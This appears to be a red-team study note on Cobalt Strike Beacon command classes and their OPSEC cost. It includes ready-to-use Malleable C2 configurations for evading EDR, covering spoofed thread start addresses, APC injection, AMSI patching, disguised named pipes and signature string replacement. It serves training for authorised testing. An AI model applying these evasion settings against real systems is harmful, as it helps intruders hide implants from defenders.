---
domain: defense-evasion-opsec
tags: [beacon, commands, BOF, fork-and-run, malleable-c2, process-inject, post-ex, OPSEC]
tools: [Cobalt-Strike]
opsec: high
exam-relevance: core
---

# Beacon Command Behavior

Understanding how each command class works under the hood is essential for making good OPSEC decisions.

> **Key concept:** Once Beacon is running in memory, every command you issue as an operator triggers a different set of underlying actions — from a simple API call to full shellcode injection, new thread creation, and a new named pipe. The OPSEC cost of a command is determined by its class, not just its name.

---

## Command Classes at a Glance

| Class | How it runs | New process? | New thread? | Shellcode? | OPSEC |
|-------|------------|:---:|:---:|:---:|-------|
| House-keeping | Client-side or task to Beacon | ✗ | ✗ | ✗ | Very low |
| API-only | Native Win32 APIs inside Beacon | ✗ | ✗ | ✗ | Low |
| Inline (BOF) | Runs within Beacon's main thread | ✗ | ✗ | ✗ | Low–Medium |
| Fork & Run | Injects DLL into a process | Sometimes | ✓ | ✓ | High |
| Process execution | Spawns a program on disk | ✓ | ✗ | ✗ | Medium |
| Service creation | Creates a Windows service | ✓ | ✗ | ✓ | High |

---

## House-keeping Commands

Set configuration options or perform admin tasks. Two sub-types:

**Handled client-side (no task sent to Beacon):**
`help`, `clear`, `downloads`, `jobs`, `note`

**Sends a task to Beacon:**
`checkin`, `sleep`, `cancel`, `powershell-import`, `spawnto`, `ppid`

Key ones: `sleep` sets interval + jitter %; `ppid` sets the parent PID for fork & run spawns; `spawnto` sets the sacrificial process for fork & run spawns.

---

## API-Only Commands

Built into Beacon and executed using native Windows APIs directly within the Beacon process. No shellcode, no new threads.

Common: `pwd`, `cd`, `ls`, `getuid`, `download`, `upload`, `kill`, `exit`, `make_token`, `steal_token`, `rev2self`

---

## Inline Commands (BOFs)

Beacon Object Files (BOFs) are compiled C programs sent down with the tasking data and executed **within Beacon's main thread** — no new thread is created. Memory is cleared after the BOF finishes.

Common: `clipboard`, `getsystem`, `kerberos_ticket_use`, `reg`, `runasadmin uac-cmstplua`, `jump psexec`

BOFs are the most common way to add custom commands to Beacon (e.g. TrustedSec's Situational Awareness BOF pack).

### Malleable C2: process-inject (BOF settings)

Even though BOFs run in Beacon's own thread, the memory allocation they use is still visible to EDR. These settings reduce that footprint:

```malleable
process-inject {
    # OPSEC: VirtualAlloc generates an allocation syscall event each time.
    # MapViewOfFile (memory-mapping) is quieter; HeapAlloc avoids VirtualAlloc entirely.
    set bof_allocator    "VirtualAlloc";

    # OPSEC: Without reuse, every BOF triggers a free + re-alloc cycle — more syscall noise.
    # With reuse=true, the allocation persists (zeroed out) and is only freed if too small.
    set bof_reuse_memory "true";

    # OPSEC: Set large enough to fit your typical BOFs so the reuse above actually works.
    # Too small = constant free/re-alloc churn despite reuse=true.
    set min_alloc        "8192";

    # OPSEC: startrwx=true means the resting memory (when no BOF is running) is RWX.
    # RWX at rest is flagged by memory scanners even when nothing is executing.
    # false = resting memory is RW only — much less suspicious.
    set startrwx         "false";

    # OPSEC: userwx=true would make the memory RWX at execution time.
    # false = splits to RX (code section) and RW (data section) — avoids RWX entirely.
    set userwx           "false";
}
```

---

## Fork & Run Commands

Post-exploitation capabilities implemented as Windows DLLs. The DLL is appended to a loader (like Beacon), producing shellcode that is injected into a process. Output is returned via a **SMB named pipe**.

> **OPSEC burden is highest here.** Every fork & run command must: inject shellcode, create a new thread, and open a named pipe. The **spawn** variant must also start a new sacrificial process. This is why `spawnto` and `ppid` matter — they control what that sacrificial process looks like.

### Explicit vs Spawn

| Variant | Target process | Commands |
|---------|---------------|----------|
| **Spawn only** | New sacrificial process | `execute-assembly`, `powerpick` |
| **Explicit only** | Existing process | `psinject` |
| **Both** | Either | `portscan`, `keylogger`, `printscreen`, `desktop`, `mimikatz` |

### Malleable C2: process-inject (Fork & Run settings)

Fork & run injects into another process, so every setting here affects what artifacts land in that target process and how visible the injection is to EDR:

```malleable
process-inject {
    # OPSEC: VirtualAllocEx is the standard but well-known injection allocator — heavily monitored.
    # NtMapViewOfSection creates a memory-mapped section instead of an explicit allocation,
    # which is harder to distinguish from legitimate shared memory. Same-arch only.
    set allocator "VirtualAllocEx";

    # Same rationale as BOFs — avoid RWX at rest and RWX at execution.
    set startrwx  "false";
    set userwx    "false";

    # Thread creation methods, evaluated top-to-bottom. More important for OPSEC than allocator choice.
    # OPSEC: CreateRemoteThread is the most monitored API for injection — EDR hooks it aggressively.
    # The address spoofing syntax "module!function+0x##" makes the thread appear to start at a
    # legitimate function, not at shellcode. Thread is created suspended at that address,
    # then its context is modified to point at shellcode before being resumed.
    execute {
        # Spoofed start address — thread looks like it originates from ntdll, not from your shellcode region.
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";

        # OPSEC: No new thread is created — queues APC on the process's primary thread at startup.
        # This is the Early Bird pattern — executes before the process is fully initialised.
        # Same-arch only. See [[APC-Injection]].
        NtQueueApcThread-s;

        # Same as above but without the early-bird timing guarantee. Same-arch only.
        NtQueueApcThread;

        # Hijacks an existing thread's context. x64→x86 supported.
        SetThreadContext;
    }
}
```

> `RtlCreateUserThread` (not shown) supports x86→x64 but **requires RWX memory** — avoid if possible.

### Malleable C2: post-ex block

Controls how the sacrificial process and post-ex DLLs behave — each setting targets a specific detection vector:

```malleable
post-ex {
    # OPSEC: Default spawnto is rundll32.exe — a known red flag in many SOC runbooks.
    # Changing to a benign-looking process like msiexec.exe makes the sacrificial process
    # harder to spot during triage. Use sysnative/syswow64 — not system32 (environment
    # variables resolve incorrectly for cross-arch processes).
    set spawnto_x64 "%windir%\\sysnative\\msiexec.exe";
    set spawnto_x86 "%windir%\\syswow64\\msiexec.exe";

    # OPSEC: Without cleanup, the post-ex loader stays mapped in the target process's memory
    # after execution — increasing the chance of memory scanner detection.
    set cleanup "true";

    # OPSEC: Default pipe name is "postex_####" — a well-known Cobalt Strike indicator.
    # Custom names that mimic legitimate Windows pipe naming (e.g. dotnet-diagnostic pipes
    # are real Windows pipes) blend into normal process communication traffic.
    # Each '#' is replaced with a random hex char at runtime.
    set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";

    # OPSEC: Some post-ex DLLs (e.g. portscanner) spawn their own threads.
    # Without a hint, those threads start at shellcode addresses — detectable by memory scanners.
    # This spoofs their start address to a legitimate ntdll function.
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";

    # OPSEC: powerpick, execute-assembly, and psinject run scripts/assemblies in memory.
    # AMSI in the spawned process can scan that content. amsi_disable patches AMSI out
    # of the target process's memory before execution.
    set amsi_disable "true";

    transform-x64 {
        # OPSEC: Post-ex DLLs contain hardcoded strings that AV signatures target.
        # strrep replaces a string across ALL post-ex DLLs — use for generic strings.
        strrep "This program cannot be run in DOS mode." "This is totally not a PE.";

        # strrepex replaces a string in ONE specific DLL — use for strings unique to that tool
        # to avoid accidentally breaking other DLLs that share similar patterns.
        # Valid targets: BrowserPivot, ExecuteAssembly, Hashdump, Keylogger, Mimikatz,
        #                NetView, PortScanner, PowerPick, Screenshot, SSHAgent
        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
    }
}
```

---

## Process Execution Commands

Spawn a program on disk. No shellcode injection, but a new process is created.

| Command | Notes |
|---------|-------|
| `execute` | Runs program, no output returned |
| `run` | Runs program, output returned |
| `shell` | Routes through `cmd.exe` |
| `powershell` | Routes through `powershell.exe` (also used by `jump winrm`, `remote-exec winrm`) |
| `runas` | Runs with alternate credentials |
| `runu` | Like `run` but attempts PPID spoofing |

---

## Service Creation Commands

Create a Windows service to run a command or Beacon — either locally or on a remote host.

| Command | Purpose |
|---------|---------|
| `elevate svc-exe` | Escalate from high-integrity to SYSTEM locally |
| `jump psexec` / `psexec64` / `psexec_psh` | Lateral movement via service |
| `remote-exec psexec` | Run an arbitrary command remotely via service |

### OPSEC

The service binary payload **always uses `rundll32` as its default spawnto**. The `post-ex.spawnto` directive in Malleable C2 cannot override this — environment variables like `%windir%` are invalid in a SYSTEM context.

**Fix:** use `ak-settings` from the Artifact Kit to set an explicit spawnto path for service payloads.

---

## Related Notes

- [[Defense-Evasion-Overview]]
- [[Beacon-Memory]]
- [[APC-Injection]]
- [[02-Domains/C2-Infrastructure-Cobalt-Strike/Interacting-with-Beacon]]
- [[02-Domains/Malware-Essentials/Process-Injection-Overview]]
